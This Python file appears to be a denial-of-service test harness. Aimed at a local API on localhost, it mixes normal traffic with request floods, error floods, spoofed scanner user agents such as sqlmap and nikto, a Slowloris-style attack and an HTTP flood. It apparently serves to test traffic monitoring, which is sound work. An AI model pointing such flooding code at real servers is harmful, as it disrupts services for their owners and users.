import asyncio
import random
import time
import json
from datetime import datetime
from typing import List, Dict, Any
import httpx
import aiofiles
from concurrent.futures import ThreadPoolExecutor
import threading

class DoSAttackSimulator:
    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url
        self.client = httpx.AsyncClient(timeout=30.0)
        self.attack_results = []
        self.normal_traffic_running = False
        
    async def close(self):
        """Clean up HTTP client"""
        await self.client.aclose()
    

    async def generate_normal_traffic(self, duration: int = 300):
        """Generate normal API traffic continuously"""
        print(f"Starting normal traffic generation for {duration} seconds...")
        self.normal_traffic_running = True
        
        start_time = time.time()
        request_count = 0
        
        while time.time() - start_time < duration and self.normal_traffic_running:
            try:
                # Random normal operations
                operation = random.choice([
                    'get_root', 'get_users', 'get_user', 'create_user', 'delete_user'
                ])
                
                if operation == 'get_root':
                    await self.client.get(f"{self.base_url}/")
                    
                elif operation == 'get_users':
                    await self.client.get(f"{self.base_url}/users")
                    
                elif operation == 'get_user':
                    user_id = random.randint(1, 20)
                    await self.client.get(f"{self.base_url}/users/{user_id}")
                    
                elif operation == 'create_user':
                    user_data = {
                        "name": f"User{random.randint(1, 1000)}",
                        "email": f"user{random.randint(1, 1000)}@example.com",
                        "age": random.randint(18, 65)
                    }
                    await self.client.post(f"{self.base_url}/users", json=user_data)
                    
                elif operation == 'delete_user':
                    user_id = random.randint(1, 10)
                    try:
                        await self.client.delete(f"{self.base_url}/users/{user_id}")
                    except:
                        pass  # Expected for non-existent users
                
                request_count += 1
                
                # Normal delay between requests
                await asyncio.sleep(random.uniform(0.5, 3.0))
                
            except Exception as e:
                print(f"Error in normal traffic: {e}")
                await asyncio.sleep(1)
        
        print(f"Normal traffic completed: {request_count} requests")
    

    async def attack_high_request_rate(self, requests_per_second: int = 50, duration: int = 60):
        """Generate high request rate attack"""
        print(f"ATTACK 1: High Request Rate - {requests_per_second} req/s for {duration}s")
        
        start_time = time.time()
        request_count = 0
        
        while time.time() - start_time < duration:
            try:
                # Burst of requests
                tasks = []
                for _ in range(requests_per_second):
                    endpoint = random.choice(['/users', '/', '/users/1'])
                    tasks.append(self.client.get(f"{self.base_url}{endpoint}"))
                
                await asyncio.gather(*tasks, return_exceptions=True)
                request_count += requests_per_second
                
                # Sleep for remainder of second
                await asyncio.sleep(max(0, 1.0 - (time.time() - start_time - (request_count // requests_per_second))))
                
            except Exception as e:
                print(f"Error in high request rate attack: {e}")
        
        print(f"High request rate attack completed: {request_count} requests")
        return {"attack_type": "high_request_rate", "requests": request_count}
    

    async def attack_high_error_rate(self, duration: int = 60):
        """Generate high error rate attack"""
        print(f"ATTACK 2: High Error Rate for {duration}s")
        
        start_time = time.time()
        request_count = 0
        error_count = 0
        
        while time.time() - start_time < duration:
            try:
                # Mix of valid and invalid requests
                operations = [
                    # Valid requests (30%)
                    (lambda: self.client.get(f"{self.base_url}/users"), 0.3),
                    (lambda: self.client.get(f"{self.base_url}/"), 0.3),
                    # Invalid requests (70%)
                    (lambda: self.client.get(f"{self.base_url}/users/99999"), 0.7),
                    (lambda: self.client.get(f"{self.base_url}/nonexistent"), 0.7),
                    (lambda: self.client.get(f"{self.base_url}/simulate-error"), 0.7),
                    (lambda: self.client.post(f"{self.base_url}/users", json={"invalid": "data"}), 0.7),
                ]
                
                for operation, weight in operations:
                    if random.random() < weight:
                        try:
                            response = await operation()
                            if response.status_code >= 400:
                                error_count += 1
                        except:
                            error_count += 1
                        request_count += 1
                
                await asyncio.sleep(0.1)
                
            except Exception as e:
                print(f"Error in high error rate attack: {e}")
        
        error_rate = error_count / request_count if request_count > 0 else 0
        print(f"High error rate attack completed: {request_count} requests, {error_rate:.2%} errors")
        return {"attack_type": "high_error_rate", "requests": request_count, "error_rate": error_rate}

    async def attack_slow_response_pattern(self, duration: int = 60):
        """Generate slow response pattern attack"""
        print(f"ATTACK 3: Slow Response Pattern for {duration}s")
        
        start_time = time.time()
        request_count = 0
        
        while time.time() - start_time < duration:
            try:
                # Target slow endpoints
                tasks = []
                for _ in range(10):  # Concurrent requests to slow endpoint
                    tasks.append(self.client.get(f"{self.base_url}/simulate-heavy-load"))
                
                await asyncio.gather(*tasks, return_exceptions=True)
                request_count += 10
                
                await asyncio.sleep(0.5)
                
            except Exception as e:
                print(f"Error in slow response attack: {e}")
        
        print(f"Slow response pattern attack completed: {request_count} requests")
        return {"attack_type": "slow_response_pattern", "requests": request_count}
    

    async def attack_suspicious_user_agent(self, duration: int = 60):
        """Generate suspicious user agent attack"""
        print(f"ATTACK 4: Suspicious User Agent for {duration}s")
        
        suspicious_agents = [
            "nikto/scanner",
            "sqlmap/1.0",
            "python-requests/2.28.1",
            "curl/7.68.0",
            "wget/1.20.3",
            "go-http-client/1.1",
            "java/1.8.0_301",
            "apache-httpclient/4.5.13",
            "nmap-nse",
            "masscan/1.0.5",
            "burp-suite-pro",
            "zap/2.11.1",
            "bot-scanner-v1.0",
            "web-scraper/3.0"
        ]
        
        start_time = time.time()
        request_count = 0
        
        while time.time() - start_time < duration:
            try:
                # Use suspicious user agents
                for user_agent in suspicious_agents:
                    headers = {"User-Agent": user_agent}
                    
                    # Make multiple requests with each suspicious UA
                    for _ in range(5):
                        endpoint = random.choice(['/users', '/', '/users/1', '/simulate-error'])
                        await self.client.get(f"{self.base_url}{endpoint}", headers=headers)
                        request_count += 1
                
                await asyncio.sleep(0.1)
                
            except Exception as e:
                print(f"Error in suspicious user agent attack: {e}")
        
        print(f"Suspicious user agent attack completed: {request_count} requests")
        return {"attack_type": "suspicious_user_agent", "requests": request_count}
    

    async def attack_endpoint_flooding(self, duration: int = 60):
        """Generate endpoint flooding attack"""
        print(f"ATTACK 5: Endpoint Flooding for {duration}s")
        
        target_endpoints = [
            "/users",
            "/users/1",
            "/simulate-heavy-load",
            "/simulate-error"
        ]
        
        start_time = time.time()
        request_count = 0
        
        while time.time() - start_time < duration:
            try:
                # Flood each endpoint
                for endpoint in target_endpoints:
                    tasks = []
                    for _ in range(50):  # 50 concurrent requests per endpoint
                        tasks.append(self.client.get(f"{self.base_url}{endpoint}"))
                    
                    await asyncio.gather(*tasks, return_exceptions=True)
                    request_count += 50
                
                await asyncio.sleep(0.1)
                
            except Exception as e:
                print(f"Error in endpoint flooding attack: {e}")
        
        print(f"Endpoint flooding attack completed: {request_count} requests")
        return {"attack_type": "endpoint_flooding", "requests": request_count}
    
    async def attack_combined_dos(self, duration: int = 120):
        """Generate combined DoS attack with multiple patterns"""
        print(f"ATTACK 6: Combined DoS Attack for {duration}s")
        
        # Run multiple attack patterns simultaneously
        tasks = [
            self.attack_high_request_rate(30, duration // 2),
            self.attack_high_error_rate(duration // 2),
            self.attack_suspicious_user_agent(duration // 2),
            self.attack_endpoint_flooding(duration // 4)
        ]
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        print("Combined DoS attack completed")
        return {"attack_type": "combined_dos", "results": results}
    
    # =================== ADVANCED ATTACK PATTERNS ===================
    async def attack_slowloris(self, duration: int = 60):
        """Simulate Slowloris-style attack"""
        print(f"ATTACK 7: Slowloris-style Attack for {duration}s")
        
        start_time = time.time()
        connection_count = 0
        
        while time.time() - start_time < duration:
            try:
                # Create many slow connections
                tasks = []
                for _ in range(100):
                    # Create connection with very long timeout
                    slow_client = httpx.AsyncClient(timeout=60.0)
                    tasks.append(slow_client.get(f"{self.base_url}/simulate-heavy-load"))
                    connection_count += 1
                
                # Don't await all - let them timeout
                await asyncio.gather(*tasks[:10], return_exceptions=True)
                await asyncio.sleep(1)
                
            except Exception as e:
                print(f"Error in slowloris attack: {e}")
        
        print(f"Slowloris attack completed: {connection_count} connections")
        return {"attack_type": "slowloris", "connections": connection_count}
    
    async def attack_http_flood(self, duration: int = 60):
        """HTTP flood attack"""
        print(f"ATTACK 8: HTTP Flood Attack for {duration}s")
        
        start_time = time.time()
        request_count = 0
        
        while time.time() - start_time < duration:
            try:
                # Massive parallel requests
                tasks = []
                for _ in range(200):
                    endpoint = random.choice(['/users', '/', '/users/1'])
                    tasks.append(self.client.get(f"{self.base_url}{endpoint}"))
                
                await asyncio.gather(*tasks, return_exceptions=True)
                request_count += 200
                
                await asyncio.sleep(0.01)  # Very short delay
                
            except Exception as e:
                print(f" Error in HTTP flood attack: {e}")
        
        print(f"HTTP flood attack completed: {request_count} requests")
        return {"attack_type": "http_flood", "requests": request_count}
    

    async def run_single_attack(self, attack_type: str, duration: int = 60):
        """Run a single attack type"""
        attack_methods = {
            "high_request_rate": self.attack_high_request_rate,
            "high_error_rate": self.attack_high_error_rate,
            "slow_response_pattern": self.attack_slow_response_pattern,
            "suspicious_user_agent": self.attack_suspicious_user_agent,
            "endpoint_flooding": self.attack_endpoint_flooding,
            "combined_dos": self.attack_combined_dos,
            "slowloris": self.attack_slowloris,
            "http_flood": self.attack_http_flood
        }
        
        if attack_type not in attack_methods:
            print(f"Unknown attack type: {attack_type}")
            return
        
        print(f"Starting {attack_type} attack...")
        result = await attack_methods[attack_type](duration)
        self.attack_results.append(result)
        return result
    
    async def run_full_attack_scenario(self):
        """Run complete attack scenario with normal traffic"""
        print("Starting Full DoS Attack Scenario")
        print("=" * 60)
        
     
        normal_traffic_task = asyncio.create_task(self.generate_normal_traffic(600))
        
        try:
       
            print("\n📍 PHASE 1: Individual Attack Patterns")
            await self.run_single_attack("high_request_rate", 30)
            await asyncio.sleep(10)  # Cool down
            
            await self.run_single_attack("high_error_rate", 30)
            await asyncio.sleep(10)
            
            await self.run_single_attack("slow_response_pattern", 30)
            await asyncio.sleep(10)
            
            await self.run_single_attack("suspicious_user_agent", 30)
            await asyncio.sleep(10)
            
            await self.run_single_attack("endpoint_flooding", 30)
            await asyncio.sleep(10)
            
            # Phase 2: Combined attacks
            print("\nPHASE 2: Combined Attack Patterns")
            await self.run_single_attack("combined_dos", 60)
            await asyncio.sleep(20)
            
            # Phase 3: Advanced attacks
            print("\nPHASE 3: Advanced Attack Patterns")
            await self.run_single_attack("slowloris", 45)
            await asyncio.sleep(10)
            
            await self.run_single_attack("http_flood", 45)
            
        finally:
            # Stop normal traffic
            self.normal_traffic_running = False
            normal_traffic_task.cancel()
        
        print("\nFull attack scenario completed!")
        print(f"Total attacks executed: {len(self.attack_results)}")
        
        # Save results
        await self.save_attack_results()
    
    async def save_attack_results(self):
        """Save attack results to file"""
        results = {
            "timestamp": datetime.now().isoformat(),
            "total_attacks": len(self.attack_results),
            "attacks": self.attack_results
        }
        
        async with aiofiles.open("attack_results.json", "w") as f:
            await f.write(json.dumps(results, indent=2))
        
        print(" Attack results saved to attack_results.json")

    async def test_connectivity(self):
        """Test connectivity to the API"""
        try:
            response = await self.client.get(f"{self.base_url}/")
            if response.status_code == 200:
                print("API connectivity test passed")
                return True
            else:
                print(f"API returned status code: {response.status_code}")
                return False
        except Exception as e:
            print(f"API connectivity test failed: {e}")
            return False
    
    async def setup_test_data(self):
        """Create some test users for realistic testing"""
        print("🔧 Setting up test data...")
        
        test_users = [
            {"name": "Alice Johnson", "email": "alice@example.com", "age": 28},
            {"name": "Bob Smith", "email": "bob@example.com", "age": 35},
            {"name": "Carol Brown", "email": "carol@example.com", "age": 42},
            {"name": "David Wilson", "email": "david@example.com", "age": 31},
            {"name": "Eva Davis", "email": "eva@example.com", "age": 29}
        ]
        
        created_users = 0
        for user in test_users:
            try:
                response = await self.client.post(f"{self.base_url}/users", json=user)
                if response.status_code == 200:
                    created_users += 1
            except Exception as e:
                print(f"Failed to create user {user['name']}: {e}")
        
        print(f"Created {created_users} test users")



async def main():
    """Main execution function"""
    simulator = DoSAttackSimulator()
    
    try:
        print("🛡️  DoS Attack Simulator Starting...")
        print("=" * 60)
        
        # Test connectivity
        if not await simulator.test_connectivity():
            print("Cannot connect to API. Make sure it's running on http://localhost:8000")
            return
        
        # Setup test data
        await simulator.setup_test_data()
        
        # Choose scenario
        print("\nSelect attack scenario:")
        print("1. Single attack (specify type)")
        print("2. Full attack scenario")
        print("3. Continuous normal traffic only")
        
        choice = input("Enter choice (1-3): ").strip()
        
        if choice == "1":
            print("\nAvailable attack types:")
            attacks = [
                "high_request_rate", "high_error_rate", "slow_response_pattern",
                "suspicious_user_agent", "endpoint_flooding", "combined_dos",
                "slowloris", "http_flood"
            ]
            for i, attack in enumerate(attacks, 1):
                print(f"{i}. {attack}")
            
            attack_choice = input("Enter attack number: ").strip()
            duration = int(input("Enter duration in seconds (default 60): ") or "60")
            
            if attack_choice.isdigit() and 1 <= int(attack_choice) <= len(attacks):
                attack_type = attacks[int(attack_choice) - 1]
                await simulator.run_single_attack(attack_type, duration)
            else:
                print("Invalid attack choice")
        
        elif choice == "2":
            await simulator.run_full_attack_scenario()
        
        elif choice == "3":
            duration = int(input("Enter duration in seconds (default 300): ") or "300")
            await simulator.generate_normal_traffic(duration)
        
        else:
            print("Invalid choice")
    
    except KeyboardInterrupt:
        print("\nAttack simulation interrupted by user")
    except Exception as e:
        print(f"Error during attack simulation: {e}")
    finally:
        await simulator.close()
        print("🔚 Attack simulator terminated")


if __name__ == "__main__":
    asyncio.run(main())
